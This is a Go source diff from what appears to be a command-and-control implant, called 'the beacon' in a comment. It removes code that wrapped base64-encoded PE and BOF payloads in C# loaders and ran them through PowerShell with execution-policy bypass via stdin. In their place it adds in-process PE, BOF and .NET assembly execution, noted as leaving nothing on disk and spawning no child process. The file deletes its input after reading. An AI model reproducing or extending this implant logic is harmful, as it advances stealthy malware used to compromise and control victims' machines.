@@ -6,7 +6,6 @@ import (
 	"bytes"
 	"context"
 	"crypto/sha256"
-	_ "embed"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
@@ -133,9 +132,6 @@ func NativeUptime() (string, error) {
 		days, hours, mins, int(secs)), nil
 }
 
-//go:embed _win_pe_loader.cs
-var peLoaderCS []byte
-
 func ExecPEInMemory(ctx context.Context, path string,
 	args []string) (string, int, error) {
 
@@ -145,66 +141,14 @@ func ExecPEInMemory(ctx context.Context, path string,
 	}
 	_ = os.Remove(path)
 
-	argLine := strings.Join(args, " ")
-	argLineCS := strings.ReplaceAll(argLine, `\`, `\\`)
-	argLineCS = strings.ReplaceAll(argLineCS, `"`, `\"`)
+	_ = ctx
+	_ = args
 
-	script := fmt.Sprintf(`
-$ErrorActionPreference = 'Stop'
-$loader = @"
-%s
-"@
-$peB64 = '%s'
-$bytes = [Convert]::FromBase64String($peB64)
-try {
-  Add-Type -TypeDefinition $loader -Language CSharp -ErrorAction Stop
-} catch {
-  if ($_.Exception.Message -notmatch 'already exists|Cannot add type') {
-    throw
-  }
-}
-$result = [PeMemoryLoader]::Execute($bytes, '%s')
-if ($result.Error) {
-  [Console]::Error.Write($result.Error)
-  exit 1
-}
-[Console]::Out.Write($result.StdOut)
-[Console]::Error.Write($result.StdErr)
-exit $result.ExitCode
-`,
-		string(peLoaderCS),
-		base64.StdEncoding.EncodeToString(raw),
-		argLineCS,
-	)
-
-	payload := append([]byte{0xFF, 0xFE},
-		utf16LEBytes(script)...)
-
-	cmd := exec.CommandContext(ctx,
-		"powershell.exe",
-		"-NoProfile", "-NoLogo", "-NonInteractive",
-		"-ExecutionPolicy", "Bypass",
-		"-Command", "-",
-	)
-	cmd.Env = sanitizedEnv()
-	cmd.Stdin = bytes.NewReader(payload)
-
-	var stdout, stderr bytes.Buffer
-	cmd.Stdout = &stdout
-	cmd.Stderr = &stderr
-
-	err = cmd.Run()
-	exitCode := 0
+	out, code, err := ExecutePEInProcess(raw, 60000)
 	if err != nil {
-		if ee, ok := err.(*exec.ExitError); ok {
-			exitCode = ee.ExitCode()
-		} else {
-			return stderr.String(), -1, err
-		}
+		return "", -1, err
 	}
-
-	combined := stdout.String() + stderr.String()
-	return combined, exitCode, nil
+	return out, code, nil
 }
 
 func ExecELFInMemory(_ context.Context, _ string,
@@ -212,95 +156,27 @@ func ExecELFInMemory(_ context.Context, _ string,
 	return "", -1, errors.New("elf in-memory execution requires a Linux target")
 }
 
-func utf16LEBytes(s string) []byte {
-	r := make([]rune, 0, len(s))
-	for _, c := range s {
-		r = append(r, c)
-	}
-	out := make([]byte, 0, len(r)*2)
-	for _, c := range r {
-		out = append(out, byte(c&0xFF), byte((c>>8)&0xFF))
-	}
-	return out
-}
-
-//go:embed _win_bof_loader.cs
-var bofLoaderCS []byte
-
 func ExecBOF(ctx context.Context, bofBytes []byte,
 	entry string, packedArgs []byte) (string, int, error) {
+
+	_ = ctx
 
 	if entry == "" {
 		entry = "go"
 	}
-	safeEntry := ""
-	for _, r := range entry {
-		if r == '\'' {
-			safeEntry += "''"
-		} else {
-			safeEntry += string(r)
-		}
-	}
-
-	script := fmt.Sprintf(`
-$ErrorActionPreference = 'Stop'
-$loader = @"
-%s
-"@
-$bofB64 = '%s'
-$argB64 = '%s'
-try {
-  Add-Type -TypeDefinition $loader -Language CSharp -ErrorAction Stop
-} catch {
-  if ($_.Exception.Message -notmatch 'already exists|Cannot add type') {
-    throw
-  }
+	return ExecuteBOFInProcess(bofBytes, entry, packedArgs)
 }
-try {
-  $bofBytes = [Convert]::FromBase64String($bofB64)
-  $argBytes = [Convert]::FromBase64String($argB64)
-  $lines = [BofLoader]::ExecuteBof($bofBytes, '%s', $argBytes)
-  foreach ($l in $lines) { [Console]::Out.WriteLine($l) }
-  $bofBytes = $null; $argBytes = $null
-  [System.GC]::Collect()
-  exit 0
-} catch {
-  [Console]::Error.Write($_.Exception.Message)
-  exit 1
-}
-`,
-		string(bofLoaderCS),
-		base64.StdEncoding.EncodeToString(bofBytes),
-		base64.StdEncoding.EncodeToString(packedArgs),
-		safeEntry,
-	)
 
-	payload := append([]byte{0xFF, 0xFE},
-		utf16LEBytes(script)...)
-
-	cmd := exec.CommandContext(ctx,
-		"powershell.exe",
-		"-NoProfile", "-NoLogo", "-NonInteractive",
-		"-ExecutionPolicy", "Bypass",
-		"-Command", "-",
-	)
-	cmd.Env = sanitizedEnv()
-	cmd.Stdin = bytes.NewReader(payload)
-
-	var stdout, stderr bytes.Buffer
-	cmd.Stdout = &stdout
-	cmd.Stderr = &stderr
-
-	err := cmd.Run()
-	exitCode := 0
-	if err != nil {
-		if ee, ok := err.(*exec.ExitError); ok {
-			exitCode = ee.ExitCode()
-		} else {
-			return stderr.String(), -1, err
-		}
-	}
-	return stdout.String() + stderr.String(), exitCode, nil
+// ExecuteAssemblyInProcess runs a .NET assembly in the beacon's
+// own process via CLR hosting. Nothing is written to disk and no
+// child process is created. The entryType and entryMethod must
+// be supplied by the caller; an assembly without a known entry
+// point should be Donut-wrapped and run through the shellcode
+// path instead.
+func ExecuteAssemblyInProcess(assembly []byte,
+	entryType, entryMethod, args string) (string, int, error) {
+	return ExecuteDotNetAssemblyInProcess(
+		assembly, entryType, entryMethod, args)
 }
 
 var (
